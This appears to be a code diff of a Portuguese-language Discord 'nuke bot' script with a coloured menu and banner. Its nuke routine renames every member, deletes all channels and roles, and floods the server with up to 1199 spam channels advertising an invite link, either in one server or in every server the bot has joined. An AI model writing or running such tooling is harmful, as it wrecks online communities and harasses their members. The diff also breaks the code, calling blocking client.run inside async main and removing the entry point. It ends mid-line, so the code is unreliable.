@@ -5,7 +5,6 @@ from os import name as os_name, system
 from sys import exit
 import time
 import itertools
-import asyncio
 
 # Inicialização do Colorama
 init()
@@ -29,36 +28,36 @@ def _input(text):
 
 # Função para animação RGB no título
 def rgb_animation(text, delay=0.1):
-    colors = [R, g, b, m, c, y]
+    colors = [r, g, b, m, c, y]
     for color in itertools.cycle(colors):
         print(f'\r{color}{text}', end='')
         time.sleep(delay)
 
 # Banner decorado
 banner = f'''
-{R}██████╗     ██╗  ██╗
-{R}██╔══██╗    ██║ ██╔╝
-{R}██║  ██║    █████╔╝ 
-{R}██║  ██║    ██╔═██╗ 
-{R}██████╔╝    ██║  ██╗
-{R}╚═════╝     ╚═╝  ╚═╝
-{Y}Feito por: {G}Menor dk 🇾🇪
+{r}██████╗     ██╗  ██╗
+{r}██╔══██╗    ██║ ██╔╝
+{r}██║  ██║    █████╔╝ 
+{r}██║  ██║    ██╔═██╗ 
+{r}██████╔╝    ██║  ██╗
+{r}╚═════╝     ╚═╝  ╚═╝
+{y}Feito por: {g}Menor dk 🇾🇪
 '''
 
 # Função para exibir informações dos servidores
 async def display_guild_info(guild):
-    print(f'\n{R}Servidor: {m}{guild.name}')
-    print(f'{C}ID: {G}{guild.id}')
-    print(f'{B}Membros: {G}{len(guild.members)}')
-    print(f'{Y}Canais: {G}{len(guild.channels)}')
-    print(f'{m}Roles: {G}{len(guild.roles)}')
+    print(f'\n{r}Servidor: {m}{guild.name}')
+    print(f'{c}ID: {g}{guild.id}')
+    print(f'{b}Membros: {g}{len(guild.members)}')
+    print(f'{y}Canais: {g}{len(guild.channels)}')
+    print(f'{m}Roles: {g}{len(guild.roles)}')
     perms = guild.me.guild_permissions
-    print(f'{W}Permissões:')
-    print(f'  {C}KICK_MEMBERS: {G}{perms.kick_members}')
-    print(f'  {C}BAN_MEMBERS: {G}{perms.ban_members}')
-    print(f'  {C}MANAGE_CHANNELS: {G}{perms.manage_channels}')
-    print(f'  {C}MANAGE_ROLES: {G}{perms.manage_roles}')
-    print(f'  {C}ADMINISTRATOR: {G}{perms.administrator}')
+    print(f'{w}Permissões:')
+    print(f'  {c}KICK_MEMBERS: {g}{perms.kick_members}')
+    print(f'  {c}BAN_MEMBERS: {g}{perms.ban_members}')
+    print(f'  {c}MANAGE_CHANNELS: {g}{perms.manage_channels}')
+    print(f'  {c}MANAGE_ROLES: {g}{perms.manage_roles}')
+    print(f'  {c}ADMINISTRATOR: {g}{perms.administrator}')
 
 async def delete_all_channel(guild):
     deleted = 0
@@ -103,47 +102,47 @@ async def create_text_channels(guild, name, message):
     return created
 
 async def nuke_guild(guild, name, message):
-    print(f'{R}Nuke: {m}{guild.name}')
+    print(f'{r}Nuke: {m}{guild.name}')
     
     # Renomeia membros
     renamed = await rename_all_members(guild, name)
-    print(f'{m}Renomeados: {B}{renamed}')
+    print(f'{m}Renomeados: {b}{renamed}')
     
     # Deleta canais
     deleted_channels = await delete_all_channel(guild)
-    print(f'{m}Canais deletados: {B}{deleted_channels}')
+    print(f'{m}Canais deletados: {b}{deleted_channels}')
     
     # Deleta roles
     deleted_roles = await delete_all_roles(guild)
-    print(f'{m}Roles deletados: {B}{deleted_roles}')
+    print(f'{m}Roles deletados: {b}{deleted_roles}')
     
     # Cria canais de texto
     created_channels = 0
     while created_channels < 1199:
         created = await create_text_channels(guild, name, message)
         created_channels += created
-        print(f'{m}Canais criados: {B}{created_channels}')
+        print(f'{m}Canais criados: {b}{created_channels}')
         time.sleep(0.555)  # Atraso para evitar problemas
     
-    print(f'{R}--------------------------------------------\n\n')
+    print(f'{r}--------------------------------------------\n\n')
 
 async def main():
     while True:
         clear()
         rgb_animation(f'{banner}                
-{C}--------------------------------------------
-{B}[Menu]
-    {Y}└─[1] {m}- {G}Executar Setup Nuke Bot
-    {Y}└─[2] {m}- {G}Sair
-    {Y}└─[3] {m}- {G}Parar
-    {Y}└─[4] {m}- {G}Ver Servidores do Bot
-{Y}====>{G}', delay=0.1)
+{c}--------------------------------------------
+{b}[Menu]
+    {y}└─[1] {m}- {g}Executar Setup Nuke Bot
+    {y}└─[2] {m}- {g}Sair
+    {y}└─[3] {m}- {g}Parar
+    {y}└─[4] {m}- {g}Ver Servidores do Bot
+{y}====>{g}', delay=0.1)
         
         choice = _input('Escolha uma opção: ')
         
         if choice == '1':
-            token = _input(f'{Y}Insira o token do bot:{G}')
-            name = _input(f'{Y}Insira o nome para os canal/nomes ')
+            token = _input(f'{y}Insira o token do bot:{g}')
+            name = _input(f'{y}Insira o nome para os canal/nomes ')
             message = '''# DKZIN 🔥🥋🇾🇪
 > - TERCEIRO COMANDO DA CAPITAL NA ATIVA,  ENTREM PRA TROPA E SEJAM FELIZES 👑
 - https://discord.com/invite/gZSx3n8Csa
@@ -156,12 +155,12 @@ async def main():
             clear()
             choice_type = _input(f'''
 {banner}                
-{C}--------------------------------------------
-{B}[Selecione]
-    {Y}└─[1] {m}- {G}Nuke de todos os servidores.
-    {Y}└─[2] {m}- {G}Nuke apenas um servidor.
-    {Y}└─[3] {m}- {G}Sair
-{Y}====>{G}''')
+{c}--------------------------------------------
+{b}[Selecione]
+    {y}└─[1] {m}- {g}Nuke de todos os servidores.
+    {y}└─[2] {m}- {g}Nuke apenas um servidor.
+    {y}└─[3] {m}- {g}Sair
+{y}====>{g}''')
             
             client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
             
@@ -175,7 +174,7 @@ async def main():
                     await client.close()
             
             elif choice_type == '2':
-                guild_id = _input(f'{Y}Insira o id do servidor:{G}')
+                guild_id = _input(f'{y}Insira o id do servidor:{g}')
                 @client.event
                 async def on_ready():
                     for guild in client.guilds:
@@ -188,14 +187,14 @@ async def main():
                 exit()
             
             try:
-                await client.start(token)
+                client.run(token)
                 _input('Nuke concluído, pressione Enter para voltar ao menu...')
                 clear()
             except Exception as error:
                 if 'Privileged Intents' in str(error):
-                    _input(f'{R}Erro de Intents\n{G}Para corrigir -> https://prnt.sc/wmrwut\n{B}Pressione Enter para voltar...')
+                    _input(f'{r}Erro de Intents\n{g}Para corrigir -> https://prnt.sc/wmrwut\n{b}Pressione Enter para voltar...')
                 else:
-                    _input(f'{R}{error}\n{B}Pressione Enter para voltar...')
+                    _input(f'{r}{error}\n{b}Pressione Enter para voltar...')
         
         elif choice == '2':
             print(f'{dr}Saindo...')
@@ -208,29 +207,26 @@ async def main():
             clear()
         
         elif choice == '4':
-            token = _input(f'{Y}Insira o token do bot:{G}')
+            token = _input(f'{y}Insira o token do bot:{g}')
             client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
             
             @client.event
             async def on_ready():
                 clear()
                 print(f'{banner}                
-{C}--------------------------------------------
-{B}[Servidores do Bot]')
+{c}--------------------------------------------
+{b}[Servidores do Bot]')
                 for guild in client.guilds:
                     await display_guild_info(guild)
-                    print(f'{C}--------------------------------------------')
+                    print(f'{c}--------------------------------------------')
                 await client.close()
             
             try:
-                await client.start(token)
+                client.run(token)
                 _input('Pressione Enter para voltar ao menu...')
                 clear()
             except Exception as error:
-                _input(f'{R}{error}\n{B}Pressione Enter para voltar...')
+                _input(f'{r}{error}\n{b}Pressione Enter para voltar...')
         
         else:
-            print(f'{R}Opção inválida. Pressione Enter para continuar...')
-
-if __name__ == "__main__":
-    asyncio.run(main())
+            print(f'{r}Opção inválida. Press
